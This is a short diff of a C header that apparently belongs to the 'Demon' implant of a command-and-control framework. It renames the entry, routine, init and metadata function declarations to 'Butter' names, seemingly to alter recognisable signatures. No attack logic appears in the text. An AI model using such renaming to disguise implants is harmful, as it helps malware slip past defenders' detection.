@@ -558,10 +558,10 @@ typedef struct
 
 extern PINSTANCE Instance;
 
-VOID DemonMain( PVOID ModuleInst, PKAYN_ARGS KArgs );
-VOID DemonRoutine( );
-VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs );
-VOID DemonMetaData( PPACKAGE* Package, BOOL Header );
+VOID ButterMain( PVOID ModInst, PKAYN_ARGS KArgs );
+VOID ButterRou( );
+VOID ButterInit( PVOID ModInst, PKAYN_ARGS KArgs );
+VOID ButterMeDat( PPACKAGE* Package, BOOL Header );
 VOID DemonConfig();
 
 #endif
